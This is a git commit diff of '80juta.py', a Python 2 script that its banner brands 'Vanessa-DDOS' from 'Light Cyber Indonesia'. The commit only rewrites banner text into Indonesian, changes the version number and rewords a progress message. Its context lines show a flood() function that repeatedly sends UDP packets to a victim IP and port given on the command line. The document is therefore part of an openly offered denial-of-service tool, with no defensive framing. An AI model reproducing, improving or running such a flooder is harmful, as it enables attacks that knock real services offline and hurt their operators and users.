d4efe7fc04c123e60033dfc768eda8f30b619daf
Jimmi Setiawan <53130905+MiSetya@users.noreply.github.com>
2019-08-11 10:40:12 +0700

    Update 80juta.py

--- 80juta.py
+++ 80juta.py
@@ -6,14 +6,14 @@ def usage():
     print "\033[1;32m#########################################################"
     print "#------------------------[\033[1;91mVannesa-DDOS\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 80juta.py " "<ip> <port> <packet> \033[1;32m   #"
-    print "#                                                                                #"
-    print "#\033[1;91mCreator:MiSetya               Vanessa Angel DDOS                      #"
-    print "#\033[1;91mTeam   :LCI                  PANTANG MUNDUR SEBELUM                   #"
-    print "#\033[1;91mVersion:0.8                         80 JUTA                           #"
-    print "#                                                                                #"
-    print "#                                                                                #"
-    print "#               \033[1;91m<--[Light Cyber Indonesia]-->                \033[1;32m#"
+    print "#   \033[1;91mMenjalankan: " "python2 80juta.py " "<ip> <port> <packet> \033[1;32m   #"
+    print "#                                                                     #"
+    print "#\033[1;91mCreator:MiSetya               Vanessa Angel DDOS           #"
+    print "#\033[1;91mTeam   :LCI                  PANTANG MUNDUR SEBELUM        #"
+    print "#\033[1;91mVersion:1.0                         80 JUTA                #"
+    print "#                                                                     #"
+    print "#                                                                     #"
+    print "#               \033[1;91m<--[Light Cyber Indonesia]-->     \033[1;32m#"
     print "#########################################################"
     print "                        @@@@@@@@@@"
     print "                       @@@@@@@@@@@@"
@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim duit \033[1;32m%s \033[1;91m80 JUTA \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mMulai \033[1;32m%s \033[1;91mmengirim duit \033[1;32m%s \033[1;91m80 juta pada target \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
